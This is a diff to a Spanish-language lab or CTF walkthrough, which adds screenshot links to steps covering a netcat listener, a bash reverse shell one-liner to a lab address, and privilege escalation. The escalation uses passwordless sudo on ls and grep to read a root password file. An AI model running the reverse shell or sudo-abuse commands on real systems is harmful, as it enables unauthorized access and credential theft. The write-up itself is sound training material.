@@ -88,15 +88,19 @@ Ejecutamos:
 
     shell
 
+![shell](screenshots/shell.PNG)
+
 En la máquina atacante, se prepara el listener:
 
     sudo nc -lvnp 444
+
+![nc](screenshots/netcat2.PNG)
 
 Y en la máquina víctima:
 
     bash -c "bash -i >& /dev/tcp/172.17.0.1/444 0>&1"
 
-![nc](screenshots/netcat.PNG)
+![bash](screenshots/bash.PNG)
 
 ---
 
@@ -129,13 +133,21 @@ Funciona correctamente.
 
 ### 9. Abuso de binarios con privilegios
 
-Se verifica que `ballenita` puede ejecutar como root:
+Se verifica que `ballenita` puede ejecutar ls y grep como root sin contraseña:
+
+![root](screenshots/exeRoot.PNG)
+
+Se ejecuta el comando:
 
     sudo /bin/ls /root
+
+![root](screenshots/passRoot.PNG)
 
 Se encuentra el archivo `secretitomaximo.txt` y se lee su contenido con:
 
     sudo /bin/grep '' /root/secretitomaximo.txt
+
+![pass](screenshots/passRootEncontrada.PNG)
 
 Se obtiene una posible contraseña de root.
 
@@ -144,6 +156,8 @@ Se obtiene una posible contraseña de root.
 ### 10. Acceso root
 
 Se prueba la contraseña obtenida y se confirma el acceso con privilegios de root.
+
+![final](screenshots/final.PNG)
 
 ---
 
